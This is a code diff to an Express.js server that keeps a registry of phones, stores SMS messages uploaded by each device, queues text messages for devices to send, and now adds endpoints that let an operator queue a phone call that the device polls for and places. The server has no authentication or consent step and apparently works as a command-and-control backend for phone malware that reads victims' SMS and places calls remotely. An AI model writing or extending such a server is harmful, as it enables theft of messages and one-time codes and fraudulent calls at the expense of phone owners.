@@ -12,6 +12,7 @@ app.use(express.json());
 const devices = {};   // deviceId -> { deviceId, model, registeredAt }
 const commands = {};  // deviceId -> [ { id, number, message } ]
 const smsData = {};   // deviceId -> latest 10 SMS
+const callQueue = {}; // deviceId -> phoneNumber
 
 // ------------------ Device Registration ------------------
 app.post("/register", (req, res) => {
@@ -21,6 +22,7 @@ app.post("/register", (req, res) => {
     devices[deviceId] = { deviceId, model: model || "unknown", registeredAt: new Date() };
     if (!commands[deviceId]) commands[deviceId] = [];
     if (!smsData[deviceId]) smsData[deviceId] = [];
+    if (!callQueue[deviceId]) callQueue[deviceId] = null;
 
     res.json({ success: true });
 });
@@ -57,7 +59,7 @@ app.post("/smsread", (req, res) => {
     const { deviceId, sms } = req.body;
     if (!deviceId || !sms) return res.status(400).json({ success: false, error: "deviceId or sms missing" });
 
-    smsData[deviceId] = sms; // store latest 10 SMS
+    smsData[deviceId] = sms; // store latest SMS
     res.json({ success: true });
 });
 
@@ -67,6 +69,25 @@ app.post("/get-sms", (req, res) => {
     if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });
 
     res.json(smsData[deviceId] || []);
+});
+
+// ------------------ Trigger a call ------------------
+app.post('/callnow', (req, res) => {
+    const { deviceId, number } = req.body;
+    if (!deviceId || !number) return res.status(400).send({ success: false, error: "Missing fields" });
+
+    callQueue[deviceId] = number;
+    res.json({ success: true, status: "queued" });
+});
+
+// ------------------ Device polls for call ------------------
+app.post('/fetchCall', (req, res) => {
+    const { deviceId } = req.body;
+    if (!deviceId) return res.status(400).send({ success: false, error: "Missing deviceId" });
+
+    const number = callQueue[deviceId] || "";
+    if (number) delete callQueue[deviceId]; // remove after sending
+    res.json({ number });
 });
 
 // ------------------ Start server ------------------
